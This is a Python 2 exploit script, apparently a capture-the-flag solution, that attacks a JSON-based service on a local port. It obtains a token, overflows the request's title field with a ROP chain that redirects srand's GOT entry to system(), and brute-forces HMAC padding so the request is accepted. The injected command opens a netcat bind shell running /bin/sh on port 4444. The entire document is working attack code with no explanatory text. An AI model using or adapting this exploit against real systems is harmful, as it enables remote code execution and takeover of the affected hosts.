import struct
import telnetlib
import socket
import json
import hmac
from hashlib import sha1

IP = "127.0.0.1"
PORT = 20003

def p(x):
    return struct.pack("<I", x)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
fd = s.makefile('rw', bufsize=0)
print "[+] Getting token"
token = s.recv(1024)
token = token.strip().strip('"')
print "[+] Token: " + token
write_addr = 0x8048d40
write_stack = p(0xdeadbeef) + p(0x804a3d4) + p(0x0804a3d4) + p(8)
ebx = "B" * 4
ebp = p(0x080491fa)
srand_got = 0x0804bcd4
offset = 0x5d5b04c4
chain = p(0x08049b4f)  # pop eax; add esp, 0x5c; ret
chain += "\\\u609b\\\u0000"  # lib srand offset from system
chain += "A" * 0x5c  # sort the add esp 0x5c
chain += p(0x08048bf0)  # pop ebx; ret
new_srand_got = (srand_got - offset)
chain += p(new_srand_got & 0xffffffff)
chain += p(0x080493fe)  # add dword ebx + (offset from above), eax
chain += p(0x8048c20)    # srand(system) PLT entry address  
chain += p(0x8048f80)   # return address for system(exit)
chain += p(0x8361608)  # argument to system() stored in gContent

cmd = "////////////////////////bin/nc -lp 4444 -e/bin/sh"
edi = "D" * 4
esi = "C" * 4
dump = "A" * 19 + ebx + esi + edi + ebp + chain
title = "O" * 127
d = '{"title": "' + title + '\\\\u' + dump + '", "contents": "' + cmd + '", "tags": ["a", "b", "c"], "serverip": "127.0.0.1"}'
print("[+] JSON: " + d)
mac = hmac.new(token, token + "\n" + d, sha1).digest()
print "[+] Test request MAC: " + mac.encode('hex')
print "[+] Modifying hash till it starts with 0000"
i = 0
new_d = ""
while True:
    new_d = d[0:-1] + ', "padding": "' + str(i) + '"}'
    hexmac = hmac.new(token, token + "\n" + new_d, sha1).digest().encode("hex")
    if "0000" in hexmac[0:4]:
            break
    i += 1

print "[+] New JSON: " + new_d
print "[+] New MAC: " + hmac.new(token, token + "\n" + new_d, sha1).digest().encode("hex")
fd.write(token + "\n" + new_d)
s.close()
